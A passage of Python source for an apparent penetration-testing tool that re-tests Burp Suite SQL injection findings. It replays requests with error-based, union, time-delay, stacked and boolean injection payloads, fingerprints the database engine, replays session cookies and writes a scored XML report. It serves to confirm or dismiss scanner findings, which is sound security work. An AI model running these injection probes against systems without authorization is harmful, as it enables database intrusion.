                    self._add_signal_unique(scoring, best)

    def _score_reliability_from_payloads(
        self,
        scoring: ScoringSummary,
        payload_results: List[PayloadResult],
        active_payloads: Dict[str, List[str]],
    ) -> None:
        test_results = [r for r in payload_results if not r.category.startswith("fingerprint_")]
        completed = [r for r in test_results if not r.error and r.status_code is not None]
        scoring.tests_completed = len(completed)
        scoring.categories_completed = sorted({r.category for r in completed})

        expected_tests = sum(len(v) for v in active_payloads.values()) if active_payloads else 0
        minimum_for_fp = min(10, expected_tests) if expected_tests else 0
        scoring.enough_tests_completed = scoring.tests_completed >= minimum_for_fp or scoring.evidence_score >= self.true_positive_threshold

        if not test_results:
            return

        error_count = len([r for r in test_results if r.error])
        timeout_count = len([r for r in test_results if r.error and "timeout" in r.error.lower()])
        error_rate = error_count / max(len(test_results), 1)

        if timeout_count:
            penalty = 30 if timeout_count / max(len(test_results), 1) > 0.30 else 10
            self._add_penalty(scoring, "payload_timeouts", penalty, f"{timeout_count} payload request(s) timed out")

        if error_rate > 0.50:
            self._add_penalty(scoring, "high_payload_error_rate", 40, f"Payload request error rate is {error_rate:.1%}")
        elif error_rate > 0.20:
            self._add_penalty(scoring, "medium_payload_error_rate", 20, f"Payload request error rate is {error_rate:.1%}")

        if expected_tests and scoring.tests_completed < minimum_for_fp and scoring.evidence_score < self.true_positive_threshold:
            self._add_penalty(
                scoring,
                "not_enough_tests_completed",
                25,
                f"Only {scoring.tests_completed}/{minimum_for_fp} minimum payload tests completed",
            )

    def _classification_from_scores(self, scoring: ScoringSummary) -> str:
        if scoring.reliability_score < 40:
            return "INCONCLUSIVE"

        # Passive Burp evidence can justify INCONCLUSIVE, but this verifier only
        # returns TRUE_POSITIVE when the live re-test produced active SQLi evidence.
        has_active_sql_evidence = any(
            sig.signal_type not in {"burp_confidence", "burp_dbms_hint", "burp_time_delay_evidence", "burp_error_behavior_evidence", "dbms_fingerprint"}
            for sig in scoring.signals
        )

        if (
            has_active_sql_evidence
            and scoring.evidence_score >= self.true_positive_threshold
            and scoring.reliability_score >= self.reliability_threshold
        ):
            return "TRUE_POSITIVE"
        if has_active_sql_evidence and scoring.evidence_score >= 100 and scoring.reliability_score >= 40:
            return "TRUE_POSITIVE"
        if (
            scoring.evidence_score < self.false_positive_threshold
            and scoring.reliability_score >= self.reliability_threshold
            and scoring.enough_tests_completed
        ):
            return "FALSE_POSITIVE"
        return "INCONCLUSIVE"

    def _confidence_from_scores(self, classification: str, scoring: ScoringSummary) -> str:
        if classification == "TRUE_POSITIVE":
            if scoring.evidence_score >= 100 and scoring.reliability_score >= 80:
                return "high"
            return "medium"
        if classification == "FALSE_POSITIVE":
            if scoring.evidence_score < 20 and scoring.reliability_score >= 80:
                return "high"
            return "medium"
        if scoring.reliability_score < 40:
            return "low"
        return "medium"

    def _build_verdict(self, classification: str, scoring: ScoringSummary) -> str:
        top_signals = sorted(scoring.signals, key=lambda s: s.score, reverse=True)[:3]
        top_penalties = sorted(scoring.penalties, key=lambda p: p.points, reverse=True)[:2]
        base = (
            f"Evidence score={scoring.evidence_score}, reliability score={scoring.reliability_score}, "
            f"confidence={scoring.confidence or 'unknown'}."
        )
        if classification == "TRUE_POSITIVE":
            reasons = "; ".join(s.reason for s in top_signals) or "SQLi evidence threshold reached."
            return f"TRUE_POSITIVE: {base} Strongest evidence: {reasons}"
        if classification == "FALSE_POSITIVE":
            return (
                f"FALSE_POSITIVE: {base} Target was reachable and authentication appeared valid, "
                f"but evidence score stayed below {self.false_positive_threshold} after "
                f"{scoring.tests_completed} completed payload test(s)."
            )
        penalty_text = "; ".join(p.reason for p in top_penalties)
        signal_text = "; ".join(s.reason for s in top_signals)
        details = []
        if signal_text:
            details.append(f"partial evidence: {signal_text}")
        if penalty_text:
            details.append(f"reliability issues: {penalty_text}")
        if not scoring.enough_tests_completed:
            details.append("not enough successful tests completed for a clean false-positive decision")
        detail = "; ".join(details) or "evidence and reliability thresholds were not decisive"
        return f"INCONCLUSIVE: {base} {detail}."

    def _time_delay_signal(self, payload: str, response_time: float, baseline_time: float) -> bool:
        requested_delay = extract_requested_delay_seconds(payload)
        threshold = max(3.0, requested_delay * 0.70) if requested_delay else TIME_DELAY_THRESHOLD_SECONDS
        return response_time >= baseline_time + threshold and response_time >= threshold


    def _fingerprint_dbms(
        self,
        finding: Finding,
        baseline_status: Optional[int],
        baseline_size: int,
        baseline_time: float,
        baseline_body: str,
    ) -> Tuple[FingerprintResult, List[PayloadResult]]:
        """Fingerprint DBMS before selecting payloads.

        Order:
            1. Passive Burp/app evidence: issue detail, original responses, baseline body.
            2. Active probes only if passive evidence is unknown.

        Active probes are added to the XML as category='fingerprint'.
        """
        # Manual DBMS wins. This skips all active version/fingerprint probes.
        if self.manual_dbms:
            return FingerprintResult(
                dbms=self.manual_dbms,
                confidence="manual",
                source="user_cli",
                version=self.manual_dbms_version,
                evidence=[f"DBMS manually specified as {self.manual_dbms}"],
            ), []

        # Complete skip: use generic payloads only.
        if self.fingerprint_mode == "off":
            return FingerprintResult(
                dbms="generic",
                confidence="skipped",
                source="fingerprint_disabled",
                evidence=["DBMS fingerprinting disabled by user"],
            ), []

        passive = passive_dbms_fingerprint(finding, baseline_body=baseline_body)
        if passive.dbms != "generic" and self.fingerprint_mode in ("auto", "passive"):
            return passive, []

        # Passive-only mode never sends DBMS/version probes.
        if self.fingerprint_mode == "passive":
            return passive, []

        probe_results: List[PayloadResult] = []
        best = FingerprintResult(dbms="generic", confidence="unknown", source="active_probe", evidence=list(passive.evidence))

        for dbms in ("mysql", "postgresql", "mssql", "oracle", "sqlite"):
            for probe_kind, payload in DBMS_FINGERPRINT_PAYLOADS.get(dbms, []):
                result = self._send_payload(finding, f"fingerprint_{dbms}_{probe_kind}", payload)
                probe_results.append(result)
                self._print_payload_result(result)
                if result.error or result.status_code is None:
                    continue

                body = result.response_body or result.response_snippet
                if self._body_matches_dbms(dbms, body):
                    result.evidence.append(f"Active fingerprint matched {dbms} error/banner pattern")
                    version = extract_dbms_version(dbms, body)
                    return FingerprintResult(
                        dbms=dbms,
                        confidence="high",
                        source="active_error_or_banner_probe",
                        version=version,
                        evidence=[f"Payload {payload!r} produced {dbms}-specific evidence"],
                    ), probe_results

                delay_delta = result.response_time - baseline_time
                if probe_kind == "time" and result.response_time >= 3.0 and delay_delta >= 2.5:
                    result.evidence.append(f"Active fingerprint time delay matched {dbms} delay primitive")
                    return FingerprintResult(
                        dbms=dbms,
                        confidence="medium",
                        source="active_time_probe",
                        evidence=[
                            f"{dbms} time primitive delayed response: {result.response_time:.2f}s vs baseline {baseline_time:.2f}s"
                        ],
                    ), probe_results

                # If a DBMS-specific boolean/version function gives a clean 200 where
                # other probes fail, treat it as weak evidence only if the body changed.
                if (
                    probe_kind == "boolean"
                    and baseline_status is not None
                    and result.status_code == baseline_status
                    and self._size_delta_significant(result.response_size, baseline_size)
                ):
                    best = FingerprintResult(
                        dbms=dbms,
                        confidence="low",
                        source="active_boolean_probe",
                        evidence=[f"{dbms} boolean/version probe changed response size from {baseline_size} to {result.response_size}"],
                    )

        return best, probe_results

    @staticmethod
    def _body_matches_dbms(dbms: str, body: str) -> bool:
        return any(pattern.search(body or "") for pattern in COMPILED_DBMS_PASSIVE_PATTERNS.get(dbms, []))

    def _seed_session_cookies(self, finding: Finding) -> None:
        """Seed the session cookie jar for this finding.

        Priority:
            1. Manual --cookie / --header "Cookie: ..."
            2. Cookie header from the Burp XML request
            3. No cookies

        The raw Cookie header is not replayed through headers because that can
        conflict with requests.Session cookie updates from Set-Cookie responses.
        """
        try:
            self.session.cookies.clear()
        except Exception:
            pass

        source = ""
        cookie_header = ""
        if self.manual_cookie:
            cookie_header = self.manual_cookie
            source = "manual CLI cookie"
        elif finding.parsed_request:
            cookie_header = header_get(finding.parsed_request.headers, "Cookie")
            source = "Burp request"

        cookies = parse_cookie_header(cookie_header)
        if cookies:
            self.session.cookies.update(cookies)
            self.console.info(f"Loaded {len(cookies)} cookie(s) from {source}")
        else:
            self.console.info("No cookies loaded for this finding")

    def _send_baseline(self, finding: Finding) -> Tuple[Optional[int], int, float, str, Optional[str]]:
        try:
            req = self._build_prepared_request(finding, payload=None)
            started = time.perf_counter()
            resp = self.session.request(**req)
            elapsed = time.perf_counter() - started
            body = response_text(resp)
            return resp.status_code, len(resp.content), elapsed, body, None
        except requests.RequestException as exc:
            return None, 0, 0.0, "", f"Baseline request failed: {exc}"
        except Exception as exc:
            return None, 0, 0.0, "", f"Baseline request error: {exc}"

    def _send_payload(self, finding: Finding, category: str, payload: str) -> PayloadResult:
        full_request = ""
        try:
            req = self._build_prepared_request(finding, payload=payload)
            full_request = self._render_request_for_report(req)
            started = time.perf_counter()
            resp = self.session.request(**req)
            elapsed = time.perf_counter() - started
            body = response_text(resp)
            snippet = body[:RESPONSE_SNIPPET_CHARS]
            return PayloadResult(
                category=category,
                payload=payload,
                status_code=resp.status_code,
                response_size=len(resp.content),
                response_time=elapsed,
                full_request_sent=full_request,
                response_snippet=snippet,
                response_body=body,
            )
        except requests.Timeout as exc:
            return PayloadResult(
                category=category,
                payload=payload,
                status_code=None,
                response_size=0,
                response_time=float(self.timeout),
                full_request_sent=full_request,
                response_snippet="",
                error=f"Timeout after {self.timeout}s: {exc}",
            )
        except requests.RequestException as exc:
            return PayloadResult(
                category=category,
                payload=payload,
                status_code=None,
                response_size=0,
                response_time=0.0,
                full_request_sent=full_request,
                response_snippet="",
                error=f"Request failed: {exc}",
            )
        except Exception as exc:
            return PayloadResult(
                category=category,
                payload=payload,
                status_code=None,
                response_size=0,
                response_time=0.0,
                full_request_sent=full_request,
                response_snippet="",
                error=f"Unexpected error: {exc}",
            )

    def _build_prepared_request(self, finding: Finding, payload: Optional[str]) -> Dict[str, Any]:
        parsed_req = finding.parsed_request
        method = finding.method.upper()
        headers = remove_hop_by_hop_headers(parsed_req.headers if parsed_req else {})
        headers.update(self.extra_headers)

        # Cookies are handled by requests.Session.cookies, not raw Cookie headers.
        # This lets Set-Cookie responses update the jar between requests.
        pop_header_case_insensitive(headers, "Cookie")
        url = finding.url
        body_data: Optional[str] = None
        json_data: Optional[Any] = None

        if parsed_req and parsed_req.path and not re.match(r"^https?://", parsed_req.path, re.I):
            # Preserve query string from the original request line.
            base = urllib.parse.urlsplit(finding.url)
            req_path = urllib.parse.urlsplit(parsed_req.path)
            url = urllib.parse.urlunsplit((base.scheme, base.netloc, req_path.path, req_path.query, req_path.fragment))

        content_type = header_get(headers, "Content-Type")

        if method in {"GET", "HEAD", "DELETE", "OPTIONS"} or self._parameter_in_url(url, finding.parameter):
            url = self._inject_into_url(url, finding.parameter, payload)
        elif method in {"POST", "PUT", "PATCH"} and parsed_req:
            if "application/json" in content_type.lower():
                # Minimal JSON support: if JSON parsing fails, fall back to URL-encoded/raw body.
                import json
                try:
                    json_data = json.loads(parsed_req.body or "{}")
                    self._inject_into_json(json_data, finding.parameter, payload)
                except Exception:
                    body_data = self._inject_into_form_body(parsed_req.body, finding.parameter, payload)
            else:
                body_data = self._inject_into_form_body(parsed_req.body, finding.parameter, payload)
        else:
            url = self._inject_into_url(url, finding.parameter, payload)

        req: Dict[str, Any] = {
            "method": method,
            "url": url,
            "headers": headers,
            "timeout": self.timeout,
            "verify": self.verify_ssl,
            "allow_redirects": False,
        }
        if json_data is not None:
            req["json"] = json_data
        elif body_data is not None:
            req["data"] = body_data.encode("utf-8")
        return req

    @staticmethod
    def _parameter_in_url(url: str, param: str) -> bool:
        query = urllib.parse.urlsplit(url).query
        return param in urllib.parse.parse_qs(query, keep_blank_values=True)

    def _inject_into_url(self, url: str, param: str, payload: Optional[str]) -> str:
        parts = urllib.parse.urlsplit(url)
        pairs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
        if not pairs:
            pairs = [(param, "")]

        updated: List[Tuple[str, str]] = []
        found = False
        for k, v in pairs:
            if k == param:
                found = True
                base = safe_baseline_value(v)
                new_value = base if payload is None else base + payload
                updated.append((k, new_value))
            else:
                updated.append((k, v))
        if not found:
            updated.append((param, BASELINE_DEFAULT_VALUE if payload is None else BASELINE_DEFAULT_VALUE + payload))

        new_query = urllib.parse.urlencode(updated, doseq=True)
        return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, new_query, parts.fragment))

    def _inject_into_form_body(self, body: str, param: str, payload: Optional[str]) -> str:
        pairs = urllib.parse.parse_qsl(body or "", keep_blank_values=True)
        if not pairs:
            pairs = [(param, "")]
        updated: List[Tuple[str, str]] = []
        found = False
        for k, v in pairs:
            if k == param:
                found = True
                base = safe_baseline_value(v)
                updated.append((k, base if payload is None else base + payload))
            else:
                updated.append((k, v))
        if not found:
            updated.append((param, BASELINE_DEFAULT_VALUE if payload is None else BASELINE_DEFAULT_VALUE + payload))
        return urllib.parse.urlencode(updated, doseq=True)

    def _inject_into_json(self, obj: Any, param: str, payload: Optional[str]) -> bool:
        if isinstance(obj, dict):
            for k, v in obj.items():
                if k == param:
                    base = safe_baseline_value(str(v))
                    obj[k] = base if payload is None else base + payload
                    return True
                if self._inject_into_json(v, param, payload):
                    return True
        elif isinstance(obj, list):
            for item in obj:
                if self._inject_into_json(item, param, payload):
                    return True
        return False

    def _render_request_for_report(self, req: Dict[str, Any]) -> str:
        method = req.get("method", "GET")
        url = req.get("url", "")
        headers = dict(req.get("headers", {}) or {})
        body = ""
        if "data" in req and req["data"] is not None:
            body = req["data"].decode("utf-8", errors="replace") if isinstance(req["data"], bytes) else str(req["data"])
        elif "json" in req:
            import json
            body = json.dumps(req["json"], ensure_ascii=False)

        parsed = urllib.parse.urlsplit(url)
        path = urllib.parse.urlunsplit(("", "", parsed.path or "/", parsed.query, parsed.fragment))
        lines = [f"{method} {path} HTTP/1.1", f"Host: {parsed.netloc}"]

        # Show that cookies were used, but redact them by default in evidence.
        has_cookie_header = any(name.lower() == "cookie" for name in headers)
        if self.session.cookies and not has_cookie_header:
            cookie_header = "; ".join(f"{c.name}={c.value}" for c in self.session.cookies)
            headers["Cookie"] = cookie_header

        for name, value in headers.items():
            safe_value = redact_header_value(name, str(value), include_secrets=self.include_secrets_in_report)
            lines.append(f"{name}: {safe_value}")
        return "\r\n".join(lines) + "\r\n\r\n" + body

    def _detect_immediate_evidence(
        self,
        category: str,
        payload: str,
        result: PayloadResult,
        baseline_status: Optional[int],
        baseline_size: int,
        baseline_time: float,
    ) -> List[str]:
        evidence: List[str] = []
        body = result.response_snippet
        fullish_body = result.response_body or result.response_snippet

        if result.status_code is None:
            return []

        # Error-based: DB error messages or deterministic server error where baseline was OK.
        if category == "error_based":
            if self._has_db_error(fullish_body):
                evidence.append("Database error pattern detected in payload response")
            elif baseline_status is not None and baseline_status < 500 <= result.status_code:
                evidence.append(
                    f"Payload caused HTTP {result.status_code} while baseline was HTTP {baseline_status}"
                )

        # Union-based: marker appears in merged output or notable successful size delta.
        if category == "union_based":
            if "SQLI_UNION_MARKER" in fullish_body:
                evidence.append("Union marker appeared in response body")
            elif baseline_status is not None and baseline_status < 500 <= result.status_code:
                # Not definitive alone, but useful with union syntax.
                evidence.append(
                    f"Union payload caused HTTP {result.status_code} while baseline was HTTP {baseline_status}"
                )
            elif result.status_code == baseline_status and self._size_delta_significant(result.response_size, baseline_size):
                evidence.append(
                    f"Union payload changed response size from {baseline_size} to {result.response_size}"
                )

        # Time-based: timeout or measured delay.
        if category == "time_blind":
            delay_delta = result.response_time - baseline_time
            if result.response_time >= TIME_DELAY_THRESHOLD_SECONDS and delay_delta >= TIME_DELAY_THRESHOLD_SECONDS:
                evidence.append(
                    f"Time delay detected: payload response {result.response_time:.2f}s vs baseline {baseline_time:.2f}s"
                )

        # Stacked queries: only classify on time delay or DB error; avoid overclaiming on generic 500s.
        if category == "stacked_queries":
            delay_delta = result.response_time - baseline_time
            if result.response_time >= TIME_DELAY_THRESHOLD_SECONDS and delay_delta >= TIME_DELAY_THRESHOLD_SECONDS:
                evidence.append(
                    f"Stacked time delay detected: payload response {result.response_time:.2f}s vs baseline {baseline_time:.2f}s"
                )
            elif self._has_db_error(fullish_body):
                evidence.append("Database error pattern detected after stacked-query payload")

        return evidence

    @staticmethod
    def _has_db_error(body: str) -> bool:
        return any(pattern.search(body or "") for pattern in COMPILED_DB_ERROR_PATTERNS)

    @staticmethod
    def _size_delta_significant(a: int, b: int) -> bool:
        delta = abs(a - b)
        if delta < BOOLEAN_MIN_ABSOLUTE_SIZE_DELTA:
            return False
        smaller = max(min(a, b), 1)
        return (delta / smaller) >= BOOLEAN_MIN_RELATIVE_SIZE_DELTA

    @staticmethod
    def _boolean_payload_kind(payload: str) -> Optional[str]:
        p = payload.lower().replace(" ", "")
        true_markers = ["1=1", "'1'='1'", '"1"="1"', "true"]
        false_markers = ["1=2", "1=0", "'1'='2'", '"1"="2"', "false"]
        if any(x.replace(" ", "") in p for x in false_markers):
            return "false"
        if any(x.replace(" ", "") in p for x in true_markers):
            return "true"
        return None

    def _detect_boolean_pair_evidence(
        self,
        true_results: List[PayloadResult],
        false_results: List[PayloadResult],
    ) -> Optional[str]:
        for t in true_results:
            for f in false_results:
                if t.status_code != f.status_code:
                    continue
                if self._size_delta_significant(t.response_size, f.response_size):
                    return (
                        "Boolean-blind behavior detected: true-condition response size "
                        f"{t.response_size} differs from false-condition response size {f.response_size}"
                    )
                sim = body_similarity_ratio(t.response_snippet, f.response_snippet)
                if sim < 0.75:
                    return f"Boolean-blind behavior detected: true/false response snippets differ, similarity={sim:.2f}"
        return None

    def _print_payload_result(self, result: PayloadResult) -> None:
        if result.error:
            self.console.warn(f"{result.category:<14} error={result.error} payload={result.payload!r}")
            return
        self.console.info(
            f"{result.category:<14} status={result.status_code} "
            f"size={result.response_size} time={result.response_time:.2f}s payload={result.payload!r}"
        )


# =============================================================================
# REPORT GENERATOR
# =============================================================================

class ReportGenerator:
    def __init__(
        self,
        console: Optional[Console] = None,
        include_secrets_in_report: bool = False,
    ) -> None:
        self.console = console or Console()
        self.include_secrets_in_report = include_secrets_in_report

    def generate(self, results: List[TestResult], output_file: str) -> None:
        total = len(results)
        true_positive = sum(1 for r in results if r.classification == "TRUE_POSITIVE")
        false_positive = sum(1 for r in results if r.classification == "FALSE_POSITIVE")
        inconclusive = sum(1 for r in results if r.classification == "INCONCLUSIVE")
        unreachable = sum(1 for r in results if r.classification == "UNREACHABLE")
        auth_failed = sum(1 for r in results if r.classification == "AUTH_FAILED")
        tested = true_positive + false_positive + inconclusive
        decisive = true_positive + false_positive
        success_rate = (true_positive / decisive * 100.0) if decisive else 0.0

        root = ET.Element("sqliVerificationReport", attrib={"version": "2.5"})
        summary = ET.SubElement(root, "summary")
        ET.SubElement(summary, "totalFindings").text = str(total)
        ET.SubElement(summary, "testedFindings").text = str(tested)
        ET.SubElement(summary, "decisiveFindings").text = str(decisive)
        ET.SubElement(summary, "truePositives").text = str(true_positive)
        ET.SubElement(summary, "falsePositives").text = str(false_positive)
        ET.SubElement(summary, "inconclusive").text = str(inconclusive)
        ET.SubElement(summary, "unreachable").text = str(unreachable)
        ET.SubElement(summary, "authFailed").text = str(auth_failed)
        ET.SubElement(summary, "truePositiveRateAmongDecisivePercent").text = f"{success_rate:.2f}"
        ET.SubElement(summary, "generatedAtEpoch").text = str(int(time.time()))

        findings_node = ET.SubElement(root, "findings")
        for result in results:
            self._append_finding(findings_node, result)

        indent_xml(root)
        tree = ET.ElementTree(root)
        tree.write(output_file, encoding="utf-8", xml_declaration=True)
        self.console.ok(f"XML report written to {output_file}")

    def _append_finding(self, parent: ET.Element, result: TestResult) -> None:
        f = result.finding
        node = ET.SubElement(parent, "finding")
        ET.SubElement(node, "serialNumber").text = f.serial_number
        ET.SubElement(node, "url").text = f.url
        ET.SubElement(node, "method").text = f.method
        ET.SubElement(node, "parameter").text = f.parameter
        ET.SubElement(node, "severity").text = f.severity
        ET.SubElement(node, "confidence").text = f.confidence
        ET.SubElement(node, "issueName").text = f.issue_name
        ET.SubElement(node, "classification").text = result.classification
        ET.SubElement(node, "verdict").text = result.verdict

        score = result.scoring
        scoring_node = ET.SubElement(node, "scoring")
        ET.SubElement(scoring_node, "evidenceScore").text = str(score.evidence_score)
        ET.SubElement(scoring_node, "reliabilityScore").text = str(score.reliability_score)
        ET.SubElement(scoring_node, "confidence").text = score.confidence
        ET.SubElement(scoring_node, "enoughTestsCompleted").text = str(score.enough_tests_completed).lower()
        ET.SubElement(scoring_node, "testsCompleted").text = str(score.tests_completed)
        cats_node = ET.SubElement(scoring_node, "categoriesCompleted")
        for cat in score.categories_completed:
            ET.SubElement(cats_node, "category").text = cat
        signals_node = ET.SubElement(scoring_node, "evidenceSignals")
        for sig in score.signals:
            snode = ET.SubElement(signals_node, "signal")
            ET.SubElement(snode, "type").text = sig.signal_type
            ET.SubElement(snode, "score").text = str(sig.score)
            ET.SubElement(snode, "reason").text = sig.reason
            ET.SubElement(snode, "category").text = sig.category
            ET.SubElement(snode, "payload").text = sig.payload
            ET.SubElement(snode, "statusCode").text = "" if sig.status_code is None else str(sig.status_code)
            ET.SubElement(snode, "responseSize").text = str(sig.response_size)
            ET.SubElement(snode, "responseTimeSeconds").text = f"{sig.response_time:.4f}"
        penalties_node = ET.SubElement(scoring_node, "reliabilityPenalties")
        for pen in score.penalties:
            pnode = ET.SubElement(penalties_node, "penalty")
            ET.SubElement(pnode, "type").text = pen.penalty_type
            ET.SubElement(pnode, "points").text = str(pen.points)
            ET.SubElement(pnode, "reason").text = pen.reason

        fp = result.fingerprint
        fp_node = ET.SubElement(node, "databaseFingerprint")
        ET.SubElement(fp_node, "dbms").text = fp.dbms
        ET.SubElement(fp_node, "confidence").text = fp.confidence
        ET.SubElement(fp_node, "source").text = fp.source
        ET.SubElement(fp_node, "version").text = fp.version
        evidence_node = ET.SubElement(fp_node, "evidence")
        for item in fp.evidence:
            ET.SubElement(evidence_node, "item").text = item

        baseline = ET.SubElement(node, "baseline")
        ET.SubElement(baseline, "statusCode").text = "" if result.baseline_status is None else str(result.baseline_status)
        ET.SubElement(baseline, "responseSize").text = str(result.baseline_size)
        ET.SubElement(baseline, "responseTimeSeconds").text = f"{result.baseline_time:.4f}"

        if result.errors:
            errors_node = ET.SubElement(node, "errors")
            for err in result.errors:
                ET.SubElement(errors_node, "error").text = err

        evidence_node = ET.SubElement(node, "originalBurpEvidence")
        ET.SubElement(evidence_node, "issueDetail").text = f.issue_detail
        requests_node = ET.SubElement(evidence_node, "requests")
        for raw_req in f.original_requests:
            ET.SubElement(requests_node, "request").text = redact_raw_http_request(
                raw_req,
                include_secrets=self.include_secrets_in_report,
            )
        responses_node = ET.SubElement(evidence_node, "responses")
        for raw_resp in f.original_responses:
            ET.SubElement(responses_node, "response").text = raw_resp

        payloads_node = ET.SubElement(node, "payloadsTested")
        for pr in result.payload_results:
            pnode = ET.SubElement(payloads_node, "payloadTest")
            ET.SubElement(pnode, "category").text = pr.category
            ET.SubElement(pnode, "payload").text = pr.payload
            ET.SubElement(pnode, "statusCode").text = "" if pr.status_code is None else str(pr.status_code)
            ET.SubElement(pnode, "responseSize").text = str(pr.response_size)
            ET.SubElement(pnode, "responseTimeSeconds").text = f"{pr.response_time:.4f}"
            ET.SubElement(pnode, "fullRequestSent").text = pr.full_request_sent
            ET.SubElement(pnode, "responseSnippet").text = pr.response_snippet[:RESPONSE_SNIPPET_CHARS]
            if pr.error:
                ET.SubElement(pnode, "error").text = pr.error
            if pr.evidence:
                evs = ET.SubElement(pnode, "evidence")
                for ev in pr.evidence:
                    ET.SubElement(evs, "item").text = ev


# =============================================================================
# MAIN
# =============================================================================

def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Verify Burp Suite SQL Injection findings and generate XML report.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--xml", default=BURP_XML_FILE, help="Burp Suite XML report path")
    parser.add_argument("--output", default=OUTPUT_XML_FILE, help="Output XML report path")
    parser.add_argument("--payload-dir", default=LOCAL_PAYLOAD_DIR, help="Local payload directory")
    parser.add_argument(
        "--payloads",
        default=None,
        help="Path to a single payload file (with categories)",
    )
    parser.add_argument("--max-payloads", type=int, default=MAX_PAYLOADS_PER_CATEGORY, help="Payloads per category")
    parser.add_argument("--http-timeout", type=int, default=HTTP_TIMEOUT, help="Target HTTP timeout in seconds")
    parser.add_argument("--baseline-samples", type=int, default=BASELINE_SAMPLE_COUNT, help="Baseline requests used to estimate response stability")
    parser.add_argument("--tp-threshold", type=int, default=TRUE_POSITIVE_SCORE_THRESHOLD, help="Evidence score needed for TRUE_POSITIVE")
    parser.add_argument("--fp-threshold", type=int, default=FALSE_POSITIVE_SCORE_THRESHOLD, help="Evidence score below this can be FALSE_POSITIVE when reliability is high")
    parser.add_argument("--reliability-threshold", type=int, default=RELIABILITY_SCORE_THRESHOLD, help="Reliability score needed for decisive TP/FP")
    parser.add_argument("--verify-ssl", action="store_true", help="Verify target SSL certificates")
    parser.add_argument(
        "--target-base-url",
        default="",
        help="Override target scheme/host/port while preserving Burp path/query, e.g. http://127.0.0.1:8080",
    )
    parser.add_argument(
        "--preserve-host-header",
        action="store_true",
        help="When using --target-base-url, keep the original Burp Host header instead of replacing it",
    )
    parser.add_argument(
        "--cookie",
        default=None,
        help="Manual Cookie header override, e.g. 'PHPSESSID=abc; security=low'. Takes priority over Burp XML cookies.",
    )
    parser.add_argument(
        "--header",
        action="append",
        default=[],
        help="Extra header to add/override. Repeatable. Example: --header 'Authorization: Bearer TOKEN'",
    )
    parser.add_argument(
        "--proxy",
        default=None,
        help="Optional upstream proxy, e.g. http://127.0.0.1:8080 for Burp. Keep Burp Intercept OFF.",
    )
    parser.add_argument(
        "--dbms",
        choices=["mysql", "postgresql", "mssql", "oracle", "sqlite", "generic"],
        default=None,
        help="Manually specify DBMS and skip active DBMS fingerprint probes.",
    )
    parser.add_argument(
        "--dbms-version",
        default="",
        help="Optional manual DBMS version for reporting only, e.g. 'MySQL 8.0'.",
    )
    parser.add_argument(
        "--fingerprint-mode",
        choices=["auto", "passive", "active", "off"],
        default="auto",
        help=(
            "DBMS fingerprint mode: auto=passive then active if unknown; "
            "passive=Burp/app evidence only; active=send active DBMS probes; "
            "off=use generic payloads only."
        ),
    )
    parser.add_argument(
        "--include-secrets-in-report",
        action="store_true",
        help="Do not redact Cookie/Authorization/API-key headers in generated XML evidence",
    )
    parser.add_argument("--allow-github", action="store_true", help="Use GitHub if local payload files are missing")
    parser.add_argument("--refresh-payloads", action="store_true", help="Download payloads from GitHub and write local files before scanning")
    parser.add_argument("--download-payloads-only", action="store_true", help="Download GitHub payloads into local files and exit")
    parser.add_argument("--init-payloads", action="store_true", help="Create local payload files from built-in fallbacks and exit")
    parser.add_argument("--overwrite-payloads", action="store_true", help="Overwrite local payload files when using --init-payloads")
    parser.add_argument("--no-early-exit", action="store_true", help="Continue testing all payloads after TP evidence")
    parser.add_argument("--list-only", action="store_true", help="Parse Burp XML and list SQLi findings without testing")
    parser.add_argument("--no-color", action="store_true", help="Disable colored console output")
    return parser


def main() -> int:
    args = build_arg_parser().parse_args()
    console = Console(no_color=args.no_color)

    console.banner("Burp SQL Injection Verification Tool v2.5")
    console.warn("Run this only against systems where you have explicit authorization.")
    console.info(f"Input XML: {args.xml}")
    console.info(f"Output XML: {args.output}")
    console.info(f"Payload directory: {args.payload_dir}")
    if args.cookie:
        console.info("Manual cookie override enabled")
    if args.header:
        console.info(f"Extra headers configured: {len(args.header)}")
    if args.proxy:
        console.info(f"Upstream proxy enabled: {args.proxy}")
    if args.dbms:
        console.info(f"Manual DBMS override enabled: {args.dbms}")
    else:
        console.info(f"Fingerprint mode: {args.fingerprint_mode}")

    loader = PayloadLoader(payload_file=args.payloads, 
        payload_dir=args.payload_dir,
        max_per_category=args.max_payloads,
        allow_github=args.allow_github,
        refresh_payloads=args.refresh_payloads,
        console=console,
    )

    if args.init_payloads:
        loader.init_payload_files(overwrite=args.overwrite_payloads)
        console.ok("Payload files initialized. Review them before scanning.")
        return 0

    if args.download_payloads_only:
        loader.refresh_payloads = True
        for dbms in DBMS_TYPES:
            loader.load_payloads_for_dbms(dbms)
        console.ok("Payload files downloaded/refreshed. Review them before scanning.")
        return 0

    try:
        parser = BurpXMLParser(console=console)
        findings = parser.parse(args.xml)
        if args.target_base_url:
            apply_target_base_url_override(
                findings,
                args.target_base_url,
                preserve_host_header=args.preserve_host_header,
                console=console,
            )
        console.ok(f"Extracted {len(findings)} SQL Injection finding(s)")
        for idx, finding in enumerate(findings, start=1):
            console.info(
                f"Finding {idx}: {finding.method} {finding.url} param='{finding.parameter}' "
                f"severity={finding.severity} confidence={finding.confidence}"
            )

        if args.list_only:
            return 0

        tester = SQLiTester(
            payload_loader=loader,
            timeout=args.http_timeout,
            verify_ssl=args.verify_ssl,
            early_exit=not args.no_early_exit,
            proxy=args.proxy,
            manual_cookie=args.cookie,
            extra_headers=args.header,
            include_secrets_in_report=args.include_secrets_in_report,
            manual_dbms=args.dbms,
            fingerprint_mode=args.fingerprint_mode,
            manual_dbms_version=args.dbms_version,
            baseline_samples=args.baseline_samples,
            true_positive_threshold=args.tp_threshold,
            false_positive_threshold=args.fp_threshold,
            reliability_threshold=args.reliability_threshold,
            console=console,
        )

        results: List[TestResult] = []
        for idx, finding in enumerate(findings, start=1):
            console.banner(f"Testing finding {idx}/{len(findings)}")
            result = tester.test_finding(finding)
            results.append(result)

        report = ReportGenerator(
            console=console,
            include_secrets_in_report=args.include_secrets_in_report,
        )
        report.generate(results, args.output)

        total = len(results)
        tp = sum(1 for r in results if r.classification == "TRUE_POSITIVE")
        fp = sum(1 for r in results if r.classification == "FALSE_POSITIVE")
        inc = sum(1 for r in results if r.classification == "INCONCLUSIVE")
